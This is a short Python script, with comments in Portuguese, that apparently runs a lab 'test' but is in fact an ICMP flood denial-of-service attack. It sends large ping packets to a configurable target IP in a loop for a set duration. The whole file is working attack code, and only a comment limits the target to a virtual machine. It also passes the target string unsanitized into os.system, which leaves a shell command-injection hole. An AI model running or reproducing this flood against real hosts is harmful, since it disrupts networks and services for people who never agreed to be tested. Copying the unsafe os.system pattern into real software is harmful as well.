import os
import time
import threading

def icmp_flood(target_ip, packet_size=65500, duration=10):
    """
    Simula um ataque ICMP Flood enviando pacotes ICMP para um alvo.
    
    target_ip: IP de destino.
    packet_size: Tamanho do pacote (65500 bytes por padrão).
    duration: Tempo total do teste em segundos.
    """
    print(f"Iniciando ICMP Flood em {target_ip} com pacotes de {packet_size} bytes por {duration} segundos.")
    
    # Define o tempo de término do ataque
    end_time = time.time() + duration

    while time.time() < end_time:
        os.system(f"ping -c 1 -s {packet_size} {target_ip} > /dev/null 2>&1")

    print("\nTeste finalizado.")

# Configuração do alvo
target_ip = "10.0.0.0"  # Altere para o IP da sua máquina virtual
packet_size = 65500  # Tamanho do pacote ICMP
duration = 10  # Tempo de ataque em segundos

# Iniciando ataque em thread separada para evitar travamentos
thread = threading.Thread(target=icmp_flood, args=(target_ip, packet_size, duration))
thread.start()
